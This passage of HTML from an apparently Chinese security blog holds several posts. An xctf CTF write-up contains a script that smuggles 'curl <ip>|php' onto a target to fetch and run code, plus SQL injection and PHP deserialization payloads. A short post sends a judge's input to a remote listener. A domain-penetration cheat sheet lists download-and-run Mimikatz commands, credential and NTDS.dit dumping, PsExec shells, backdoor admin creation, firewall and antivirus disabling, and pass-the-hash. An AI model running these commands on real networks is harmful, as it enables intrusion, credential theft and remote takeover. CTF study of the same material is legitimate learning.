class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*v&gt;%s&#x27;</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">&#x27;&gt;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ph\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;sh &#x27;</span> + pos2,</span><br><span class="line">    <span class="string">&#x27;sh &#x27;</span> + pos0,</span><br><span class="line">]</span><br><span class="line">burp0_url = <span class="string">&quot;http://121.36.222.22:88/core/index.php&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;d0669b0c49bf308022c430b52699b257&quot;</span>, <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;E1715942F5CF2C337F1B86D0B6F324E0&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://121.36.222.22:88&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://121.36.222.22:88/core/index.php&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">4</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;compress.zlib://data:@127.0.0.1/plain;base64,&quot;</span>+<span class="built_in">str</span>(base64.b64encode(<span class="built_in">bytes</span>(i,encoding=<span class="string">&quot;ascii&quot;</span>)),encoding=<span class="string">&quot;ascii&quot;</span>)&#125;</span><br><span class="line">    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code,burp0_data,i)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>flag&#123;B11e_oX4461_Y2h1_100_OIZW4===&#125;</code></p>
<h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><p>最简单的题目之一</p>
<p>payload:<code>&#39;-&#39;0</code></p>
<h3 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h3><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php">https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php</a><br>直接include就可以了,但是有时候可以,有时候不可以<br><img src="https://i.loli.net/2020/03/08/Cd7RqZwApre2Lxo.png" alt="image16793"></p>
<p>flag{SObARsac1TyC0V9B}</p>
<h3 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h3><p><a target="_blank" rel="noopener" href="http://www.zip获得源码/">www.zip获得源码</a></p>
<p>利用mysql load data 来 反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar,phar伪协议不用phar后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Fileupload(<span class="keyword">new</span> Listfile(<span class="string">&quot;/;/readflag;&quot;</span>));</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p>
<p>刚开始的时候本地成功打通,但是靶机那里怎么也打不通</p>
<p>自己弄了个7.3.15的环境后发现</p>
<p><img src="https://i.loli.net/2020/03/09/9bRVz63Ym7LDNxr.png" alt="image17357"><br>option那里要数字不要字符串<br>MYSQLI_OPT_LOCAL_INFILE对应的数字是8</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/" data-id="cku89gxvo006ywvoscmlo5cys" data-title="xctf高校抗疫" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-在线oj获取数据" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/">在线oj获取数据</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys    </span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;39.108.164.219&#x27;</span></span><br><span class="line">port = <span class="number">60000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_raw</span>(<span class="params">raw</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.create_connection((ip, port), timeout=<span class="number">10</span>) <span class="keyword">as</span> conn:</span><br><span class="line">            conn.send(<span class="built_in">bytes</span>(raw,encoding=<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            conn.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</span><br><span class="line">    data+=line</span><br><span class="line">send_raw(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>vps上运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">i=1</span><br><span class="line">while [ $i -eq 1 ]</span><br><span class="line">do </span><br><span class="line">	 nc -FNlp 60000  &gt;&gt; /tmp/data</span><br><span class="line">	echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/data</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" data-id="cku89gxvq0075wvosfsf67m7g" data-title="在线oj获取数据" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-域渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="域渗透学习笔记"><a href="#域渗透学习笔记" class="headerlink" title="域渗透学习笔记"></a>域渗透学习笔记</h1><h2 id="名词-缩写"><a href="#名词-缩写" class="headerlink" title="名词/缩写"></a>名词/缩写</h2><p> 活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 </p>
<h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p> 将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 </p>
<h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p> 域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p>
<p> 默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p>
<h2 id="一些其他关于域的知识"><a href="#一些其他关于域的知识" class="headerlink" title="一些其他关于域的知识"></a>一些其他关于域的知识</h2><h3 id="DNS定位域控制器"><a href="#DNS定位域控制器" class="headerlink" title="DNS定位域控制器"></a>DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p>
<p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p>
<p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p>
<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p> 通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从<strong>域成员主机内存中</strong>dump出域管理员密码，进而拿下域控制器、渗透整个内网。 </p>
<h2 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery server #得到域控制器的IP</span><br></pre></td></tr></table></figure>

<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p>
<p><code>net group &quot;domain controllers&quot; /domain</code>: 得到域控制器主机名 </p>
<p> 注意通过该指令得到的机器名后面会多一个$符号</p>
<p><code>net group &quot;domain admins&quot; /domain</code>  : 查询域管理用户 </p>
<p><code>net user /domain</code>查看所有域用户</p>
<p><code>net config workstation</code> : 查询当前登陆域 </p>
<p><code>net accounts /domain</code>:  查询域密码策略 </p>
<p><code>wmic qfe</code> : 查看补丁信息 </p>
<p><code>wmic os</code>:  查看操作系统类型 </p>
<p><code>ipconfig /all  </code>查询本机IP段，所在域等</p>
<p><code>tasklist /S ip /U domain\username /P /V             </code>查看远程计算机进程列表</p>
<p> 有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递攻击了 </p>
<h4 id="批量查找-域管理员登陆过目标计算机"><a href="#批量查找-域管理员登陆过目标计算机" class="headerlink" title="批量查找 域管理员登陆过目标计算机"></a>批量查找 域管理员登陆过目标计算机</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> check ip addr config file...</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"><span class="built_in">echo</span> read and analysis file...</span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span> &amp;(<span class="built_in">echo</span> <span class="variable">%%i</span> &amp;tasklist /s <span class="variable">%%i</span> /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h4 id="批量反弹cmdshell"><a href="#批量反弹cmdshell" class="headerlink" title="批量反弹cmdshell"></a>批量反弹cmdshell</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> check ip addr config file...</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exist</span> ip.txt <span class="built_in">echo</span> ip addr config file ip.txt does <span class="keyword">not</span> <span class="keyword">exist</span>! &amp; <span class="keyword">goto</span> end</span><br><span class="line"><span class="built_in">echo</span> read and analysis file...</span><br><span class="line"><span class="keyword">for</span> /F &quot;eol=#&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> <span class="built_in">start</span> PsExec.exe \\<span class="variable">%%i</span> -accepteula -u administrator -p &quot;<span class="number">123456</span>&quot; <span class="built_in">cmd</span> &amp; <span class="built_in">start</span> <span class="built_in">cmd</span> /c PsExec.exe \\<span class="variable">%%i</span> -u administrator -p &quot;<span class="number">123456</span>&quot; <span class="built_in">cmd</span></span><br><span class="line">:end</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<h3 id="访问内网其他主机"><a href="#访问内网其他主机" class="headerlink" title="访问内网其他主机"></a>访问内网其他主机</h3><p> net use建立Ipc$连接、wmic指令连接、采用rdp方式连接 , psexec进行远程连接 </p>
<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p>
<p><code>net use \\ip\ipc$ pawword /user:username  </code>建立IPC会话</p>
<h3 id="抓取内存中的hash-密码"><a href="#抓取内存中的hash-密码" class="headerlink" title="抓取内存中的hash/密码"></a>抓取内存中的hash/密码</h3><p>抓明文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCerts</span><br></pre></td></tr></table></figure>

<h4 id="普通hash"><a href="#普通hash" class="headerlink" title="普通hash"></a>普通hash</h4><p>抓hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>

<p>抓取明文:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
<p>抓取hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p>
<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p>
<h4 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h4><p>NTDS.dit获取域控hash</p>
<p>这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。</p>
<p>手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。</p>
<p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p>
<p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:注意-d 为ntds.dit路径,-s为system(导出的)路径</p>
<p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -system SYSTEM -ntds ntds.dit local</span><br><span class="line">python secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p>
<p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p>
<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user ccreater Abc1234 /add</span><br><span class="line">net localgroup administrators ccreater /add</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="域控提取域用户hash"><a href="#域控提取域用户hash" class="headerlink" title="域控提取域用户hash"></a>域控提取域用户hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exe是域控制器自带的域数据库管理工具，从windows 2008就默认自带了 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ntdsutil </span><br><span class="line">	snapshot—activate instance ntds</span><br><span class="line">	create</span><br><span class="line">	mount &#123;guid&#125;</span><br><span class="line">copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit</span><br></pre></td></tr></table></figure>

<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p>
<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p>
<p> 最后执行 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unmount &#123;guid&#125;</span><br><span class="line">delete &#123;guid&#125;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p> 删除装载点即可，避免被发现 </p>
<p>接着上传工具QuarksPwDump到域控制器上，然后执行如下命令，成功提取用户hash</p>
<p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p>
<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off#关闭防火墙</span><br><span class="line">net stop windefend</span><br><span class="line">netsh firewall set opmode mode=disable</span><br><span class="line">bcdedit.exe /set&#123;current&#125; nx AlwaysOff#关闭DEP</span><br><span class="line">meterpreter &gt; run killav  关闭杀毒软件 </span><br></pre></td></tr></table></figure>





<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p> 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。 </p>
<h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> 微软给出的补丁是kb3011780，在server 2000以上的域控中，如果没有打这个补丁，那么情况将比较糟糕，利用该漏洞可以将任何一个域用户提权至域管理员权限，危害极大。 </p>
<h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>目标:192.168.52.138</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set lhost xxx</span><br><span class="line">set lport xxx</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</span><br></pre></td></tr></table></figure>

<h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>显然，其实它只需要NThash部分就好啦。</p>
<h2 id="copy-于"><a href="#copy-于" class="headerlink" title="copy 于"></a>copy 于</h2><p> <a target="_blank" rel="noopener" href="http://www.xmrseo.com/?post=87">http://www.xmrseo.com/?post=87</a> </p>
<p> <a target="_blank" rel="noopener" href="https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/217681.html">https://www.freebuf.com/articles/system/217681.html</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="cku89gxvr0078wvosar8ee5ku" data-title="域渗透" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-巅峰极客" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">巅峰极客</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:&#x61;&#98;&#99;&#x64;&#x65;&#x66;&#x67;&#x68;&#x69;&#106;&#49;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#98;&#99;&#x64;&#x65;&#x66;&#x67;&#x68;&#x69;&#106;&#49;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#x6d;</a></p>
<p>黑名单:union</p>
